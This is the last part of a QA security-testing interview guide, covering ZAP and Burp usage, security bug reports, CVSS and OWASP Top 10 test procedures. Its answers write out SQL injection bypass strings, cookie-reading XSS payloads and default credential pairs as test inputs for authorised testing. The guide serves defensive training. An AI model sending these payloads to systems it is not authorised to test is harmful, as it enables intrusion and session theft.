| **securityheaders.com** | HTTP security header presence check | Free online |
| **webhook.site** | Receive and inspect HTTP requests — used for SSRF testing | Free online |
| **RestAssured** | Automated API security tests in Java | Free (open source) |
| **Playwright** | Browser-level XSS detection and session testing | Free (open source) |
| **npm audit / mvn dependency:check** | Known CVEs in project dependencies | Free (built in) |

---

**Q27: What is OWASP ZAP? How do you use it for a basic scan?**

**A:** OWASP ZAP (Zed Attack Proxy) is a free, open-source web application security scanner maintained by OWASP. It is the most accessible security testing tool for QA engineers and is widely used in CI/CD pipelines.

**How to run a basic automated scan:**

1. Download from zaproxy.org and launch ZAP.
2. On the Quick Start tab, select "Automated Scan."
3. Enter the URL of the application (use a test environment — never scan production without permission).
4. Click "Attack." ZAP runs a spider (discovers pages) followed by an active scan (sends attack payloads to all discovered endpoints).
5. When the scan completes, review the Alerts tab. Each alert shows: the URL, the request that triggered it, the response, the evidence, the OWASP reference, and a suggested remediation.

**Using ZAP as a manual proxy:**

1. Configure your browser to use `localhost:8080` as its HTTP proxy.
2. Browse the application manually — ZAP records every request in the Sites tree.
3. Right-click any recorded request and select "Active Scan" to attack that specific endpoint.
4. This is useful for testing authenticated areas that the spider cannot reach by itself.

**Important:** Only ever use ZAP against applications and environments you are authorised to test. Active scans send attack payloads and can corrupt test data.

---

**Q28: What is Burp Suite? What is the difference between Community and Pro editions?**

**A:** Burp Suite by PortSwigger is the industry-standard toolkit for web application security testing. It intercepts HTTP and HTTPS traffic between the browser and server, allowing you to inspect, modify, and replay any request.

**Community Edition (Free):**
- Proxy — intercept and view all requests and responses
- Repeater — manually modify and resend captured requests
- Intruder — send a request with payloads in marked positions (rate-limited in Community)
- Decoder — encode/decode URL, Base64, HTML
- Comparer — diff two requests or responses

**Professional Edition (Paid):**
- All Community features, unlimited
- Intruder without rate limits (allows fast automated scanning)
- Burp Scanner — automated vulnerability scanner (equivalent to ZAP)
- Collaborator — out-of-band detection (detects blind SSRF, blind SQL injection, blind XSS)
- Advanced session handling and authentication support

**How QA engineers use Burp Community:**

1. Download from portswigger.net/burp and launch.
2. Configure the browser to proxy via `127.0.0.1:8080`.
3. Install Burp's CA certificate in the browser to intercept HTTPS.
4. Browse the application — all requests appear in Proxy > HTTP History.
5. Right-click a request and "Send to Repeater."
6. In Repeater, modify the request (change an ID for IDOR testing, inject a payload for SQL injection, add a role field for mass assignment) and send it. Analyse the response.

---

## SECTION 11 — Raising Security Bugs

---

**Q29: How do you raise a security bug? What makes it different from a regular bug?**

**A:** Security bugs require special handling that differs from standard functional defects in several important ways:

**Key differences:**

1. **Never go in a public backlog.** A functional bug in a public Jira board is a quality issue. A security bug in a public Jira board is an advertisement to anyone with access — developers, contractors, auditors, external users — showing them exactly how to exploit the application. Security bugs must go into a restricted security project visible only to authorised team members.

2. **Immediate notification for critical findings.** A UI alignment bug can wait for the next sprint review. A SQL injection on the login endpoint cannot. Notify the team lead and the security point of contact directly, out of band.

3. **Document the exact exploit.** The report must contain: the exact payload, the exact URL, the exact steps to reproduce, a screenshot or HTTP capture of the successful exploit, and the actual response received.

4. **State the impact clearly.** What data is accessible? Which users are affected? What can the attacker do?

**Security bug report format:**

```
SECURITY DEFECT REPORT
=======================
Title: SQL Injection in Login Form Allows Authentication Bypass
Classification: CONFIDENTIAL — SECURITY
Severity: Critical
CVSS Score: 9.1/10
OWASP Category: A03:2021 — Injection

ENVIRONMENT:
URL: https://test.example.com/api/auth/login
Build: 2.4.1 | Environment: Test

STEPS TO REPRODUCE:
1. Send POST /api/auth/login with body: {"email": "' OR '1'='1", "password": "anything"}

PAYLOAD: email = ' OR '1'='1

ACTUAL RESULT:
HTTP 200 OK — logged in as admin@example.com (first DB user)

EXPECTED RESULT:
HTTP 401 Unauthorized — no login without valid credentials

RISK: Attacker can gain full admin access without credentials.

REMEDIATION: Use parameterised queries.
  PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE email = ?");
  ps.setString(1, email);
```

---

**Q30: What is CVSS? What are the severity levels?**

**A:** CVSS stands for Common Vulnerability Scoring System. It is the industry standard for scoring the severity of security vulnerabilities on a scale of 0.0 to 10.0. The score accounts for how easily the vulnerability can be exploited, what privileges are required, what the impact is (confidentiality, integrity, availability), and whether user interaction is needed.

**CVSS severity levels:**

| Score | Severity |
|-------|----------|
| 0.0 | None |
| 0.1 – 3.9 | Low |
| 4.0 – 6.9 | Medium |
| 7.0 – 8.9 | High |
| 9.0 – 10.0 | Critical |

**Practical guide for QA — severity classification without calculating the full score:**

| Finding | Suggested Severity |
|---------|-------------------|
| SQL injection / authentication bypass | Critical |
| Remote code execution | Critical |
| Stored XSS exposing session cookies | High |
| IDOR exposing sensitive personal data | High |
| Reflected XSS | Medium |
| Missing rate limiting on login | Medium |
| Security header missing | Low |
| Verbose error message (stack trace) | Low to Medium |
| Default credentials accepted | Critical or High depending on what it unlocks |

**Note for interview:** You do not need to calculate the full CVSS vector in a QA interview. Being able to name the levels, explain the 0–10 scale, and correctly classify a finding as Critical/High/Medium/Low is sufficient.

---

**Q31: What is the difference between QA security testing and penetration testing?**

**A:** These are complementary activities that operate at very different depths and serve different purposes.

**QA security testing:**
- Performed by QA engineers as part of every test cycle
- Takes hours to a few days
- Tools: Burp Suite Community, OWASP ZAP, browser DevTools, RestAssured, Playwright
- Scope: application layer — OWASP Top 10, input validation, authentication, authorisation, API security
- Happens before every release
- Output: security defect tickets in the restricted project

**Penetration testing:**
- Performed by specialist security engineers or a third-party security firm
- Takes days to weeks
- Tools: Burp Suite Pro, Metasploit, custom exploits, nmap, Nuclei, Cobalt Strike
- Scope: full attack surface — application, network, infrastructure, sometimes social engineering and physical security
- Custom exploit development, chained attacks across multiple vulnerabilities
- Happens once or twice a year, or after major architecture changes
- Output: formal written penetration test report with risk ratings, evidence, and remediation roadmap

**The right answer in an interview:** "Both are necessary. QA catches the common, high-frequency vulnerabilities quickly and cheaply during every release cycle. Penetration testing finds the sophisticated, chained, and infrastructure-level vulnerabilities that require specialist expertise. QA security testing is not a substitute for pentesting — it is a complement to it."

---

## SECTION 12 — Interview Q&A

---

**Q32: Can you name all 10 items in the OWASP Top 10 (2021)?**

**A:** Yes. The OWASP Top 10 (2021) is:

1. **A01 — Broken Access Control** — users accessing resources or performing actions they are not permitted to
2. **A02 — Cryptographic Failures** — sensitive data exposed due to weak or missing encryption
3. **A03 — Injection** — SQL injection, XSS, command injection through unsanitised input
4. **A04 — Insecure Design** — missing controls at design level (no rate limiting, no CAPTCHA, skippable payment flow)
5. **A05 — Security Misconfiguration** — default credentials, debug mode on, missing security headers
6. **A06 — Vulnerable and Outdated Components** — libraries and dependencies with known CVEs
7. **A07 — Identification and Authentication Failures** — weak passwords allowed, no lockout, session not invalidated on logout
8. **A08 — Software and Data Integrity Failures** — insecure deserialization, unverified updates
9. **A09 — Security Logging and Monitoring Failures** — failed logins not logged, no alerting on suspicious activity
10. **A10 — Server-Side Request Forgery (SSRF)** — server tricked into making requests to attacker-controlled URLs

---

**Q33: Walk me through how you would test for SQL injection.**

**A:** I approach SQL injection testing systematically across all user inputs:

1. **Identify all input points:** form fields (login, search, registration, profile update), URL parameters, API request bodies, HTTP headers (User-Agent, Referer, Cookie values)
2. **Start with the basic probe:** enter a single quote `'` in each field. If the application returns an HTTP 500 with a database error message, it is almost certainly vulnerable.
3. **Test login forms with bypass payloads:** `' OR '1'='1` in the email field with any password. Expected: 401. Failure: 200 with a logged-in response.
4. **Test boolean-based injection in search fields:** send `test' AND '1'='1` (should return results) and `test' AND '1'='2` (should return no results). If the results differ in the expected way, the input is evaluated as SQL — injection confirmed.
5. **Test with RestAssured for automation:** send each payload via the API and assert: status code is never 500, body never contains database error strings, status is never 200 when using a bypass payload.
6. **Expected result:** a secure application returns a generic error (not a 500, not a DB error message) for every payload.

---

**Q34: Describe how you would test for stored XSS in a comment field.**

**A:**

1. Log in as User A (the attacker account).
2. Navigate to a page with a comment field (forum post, product review, support ticket).
3. Enter the XSS payload as the comment: `<img src=x onerror=alert(document.cookie)>`.
4. Submit the comment.
5. Log out of User A's account.
6. Log in as User B (the victim account) in a separate browser or incognito window.
7. Navigate to the same page where the comment was submitted.
8. If the application is vulnerable: an alert box fires in User B's browser, displaying User B's session cookie. This proves the payload was stored and executed in another user's browser context.
9. If the application is secure: no alert fires. The comment is displayed as literal text (the payload is HTML-encoded: `&lt;img src=x onerror=alert(document.cookie)&gt;`).

In Playwright, I listen for the `dialog` event and assert it never fires. I also check `page.content()` to confirm the payload appears encoded.

---

**Q35: What is IDOR and how do you test it on a REST API?**

**A:** IDOR (Insecure Direct Object Reference) occurs when an API uses a user-controlled value to access a record without checking that the requesting user is authorised to access that specific record.

**To test via REST API:**

1. Create two accounts (User A and User B). Note the IDs of User B's resources from their perspective.
2. Authenticate as User A. Use User A's session token.
3. Send `GET /api/orders/{userBsOrderId}` with User A's token.
4. Expected: 403 Forbidden.
5. Failure: HTTP 200 with User B's order data in the response.

Also test: `DELETE /api/posts/{userBsPostId}`, `PUT /api/addresses/{userBsAddressId}`, and other modifying operations. IDOR on a DELETE or PUT is more severe than on a GET.

---

**Q36: How would you test a login page for security if you had 30 minutes?**

**A:** I would prioritise the highest-risk areas that take the least time:

**Minutes 1–5: SQL injection**
- Enter `' OR '1'='1` in the email field and any value in the password field.
- Confirm: response is 401 with a generic message, no 500, no database error string.

**Minutes 5–10: XSS**
- Enter `<script>alert(1)</script>` in the email field. Observe the response — is the tag encoded?
- Check the forgot password flow for XSS in the email field.

**Minutes 10–15: Authentication bypass and enumeration**
- Try `admin/admin`, `admin/password`, `root/root` — must be rejected.
- Observe the error message for "user not found" vs "wrong password" — the message must be identical in both cases (no user enumeration).

**Minutes 15–20: Account lockout and rate limiting**
- Submit 10 wrong passwords — does the account lock or return 429?

**Minutes 20–25: Session token after logout**
- Log in, copy the token. Log out. Try the token — must return 401.

**Minutes 25–30: Transport and cookie security**
- Check HTTPS enforcement (HTTP redirects to HTTPS).
- Inspect the session cookie in DevTools: `Secure` flag set? `HttpOnly` flag set? `SameSite=Strict` or `Lax`?

This covers OWASP A01, A02, A03, A05, and A07 — the most impactful findings on a login page.

---

**Q37: What HTTP security headers do you check and what does each one do?**

**A:**

| Header | What It Does | Failure Risk if Missing |
|--------|-------------|------------------------|
| `Strict-Transport-Security` | Forces browser to use HTTPS for a specified period | Man-in-the-middle via HTTP downgrade |
| `Content-Security-Policy` | Specifies which scripts, styles, and resources are allowed to load | Makes XSS more exploitable |
| `X-Content-Type-Options: nosniff` | Prevents browser from MIME-sniffing the content type | Drive-by download attacks via MIME confusion |
| `X-Frame-Options: DENY` | Prevents the page from being loaded in an iframe | Clickjacking attacks |
| `Referrer-Policy: no-referrer` | Controls how much referrer info is sent to other sites | Leaks internal URLs in referrer header |
| `Permissions-Policy` | Restricts browser features (camera, mic, geolocation) | Feature abuse if CSP is bypassed |

**How to check quickly:**

```bash
curl -I https://example.com | grep -E "Strict|Content-Security|X-Content|X-Frame|Referrer|Permissions"
```

Or use securityheaders.com — enter the URL and get a letter grade (A+ to F) with a breakdown of each header.

---

**Q38: What is the difference between a 403 and a 401 response? When should each be returned?**

**A:**

**401 Unauthorized:** The request has not been authenticated. The server does not know who the user is. The client should authenticate and try again. This is the correct response when no token is provided, or when the token is expired or invalid.

**403 Forbidden:** The request has been authenticated — the server knows who the user is — but the authenticated user does not have permission to access the requested resource. Authentication would not help. This is the correct response for IDOR (User A trying to access User B's resource), role-based access control failures (a standard user trying to access an admin endpoint), and access to resources the user simply does not own.

**In security testing:** If a request with no token returns 200 (instead of 401), that is an authentication failure. If a request with a valid token for User A returns User B's data (instead of 403), that is a Broken Access Control failure (IDOR).

---

**Q39: How do you test for Vulnerable and Outdated Components (OWASP A06)?**

**A:** QA's role here is awareness, triggering, and CI integration rather than deep CVE analysis.

**What QA does:**

1. **Dependency scanning in CI:** Ensure the CI pipeline runs a dependency check as part of every build.
   - Node.js: `npm audit`
   - Maven: `mvn org.owasp:dependency-check-maven:check`
   - Python: `safety check` or `pip-audit`
   - Docker images: `trivy image <image-name>`

2. **Block on critical findings:** Configure the pipeline to fail if any dependency has a CVSS score of 7.0 or above (High or Critical). Do not release with an unresolved critical CVE.

3. **Snyk / OWASP Dependency-Check:** Tools that scan the dependency tree and cross-reference against CVE databases. Integrate into the PR check.

4. **Flag to the team:** QA does not fix CVEs — that is a developer task. But QA ensures the check runs and the result is visible, and raises a defect if a high-severity CVE is found.

```bash
# Node.js dependency vulnerability check
npm audit

# Fix automatically fixable vulnerabilities
npm audit fix

# Maven check
mvn org.owasp:dependency-check-maven:check
```

---

**Q40: How do you test Security Logging and Monitoring (OWASP A09)?**

**A:** Logging and monitoring failures mean that attacks go undetected because the application does not log security-relevant events, or the logs are not monitored.

**What QA verifies:**

1. **Failed logins are logged:** Perform a failed login attempt. Ask the developer to show the log entry (or check a log tool like Kibana/Splunk). Verify the entry exists and contains: timestamp, IP address, username attempted, event type "FAILED_LOGIN."

2. **Successful logins are logged:** Log in successfully. Verify the log entry exists with timestamp, IP, user ID.

3. **Unauthorised access attempts are logged:** Attempt to access an admin endpoint as a standard user. Verify the 403 response is logged.

4. **Logs do not contain sensitive data:** The log entries must not contain: passwords, full card numbers, tokens, or session IDs. These would make the logs themselves a security liability.

5. **Logs are not publicly accessible:** Try browsing to `/logs`, `/app.log`, `/error.log` — these must return 404 or 403.

6. **Rate-limit events are logged:** After triggering a 429 response, verify the rate limit event is logged with the IP address.

**Note in interview:** QA cannot always see logs directly in all organisations. What QA can do is ensure logging is part of the acceptance criteria for security features and verify it as part of the test cycle with developer support.

---

**Q41: What is insecure deserialization and how does QA test for it?**

**A:** Insecure deserialization (part of OWASP A08) occurs when an application accepts serialised data (a binary or text representation of an object) from an untrusted source and deserialises it without validation. An attacker can craft a malicious serialised object that, when deserialised, executes arbitrary code (Remote Code Execution) or manipulates the application's logic.

**From a QA perspective:**

1. **Send malformed serialised data:** If the API accepts JSON, send malformed JSON. If it accepts XML, send malformed XML. If it accepts a Base64-encoded object, modify the Base64 string.
2. **Expected:** HTTP 400 Bad Request — the server rejects and handles the malformed input gracefully.
3. **Failure:** HTTP 500 — server crashed on deserialisation. This indicates the server is not validating input before deserialising.
4. **Test unexpected field types:** Send a string where a number is expected, an array where an object is expected, a deeply nested structure to test for stack overflow.
5. **Test extremely large payloads:** Send a payload that is much larger than expected — does the server handle it or crash?

QA cannot typically trigger full RCE in a testing context, but identifying unhandled 500 responses on malformed input is a meaningful signal that deserialisation is not protected.

---

*End of Security Testing OWASP Q&A Guide — 41 questions covering all OWASP Top 10 categories, injection testing, XSS, authentication, API security, tools, and interview scenarios.*
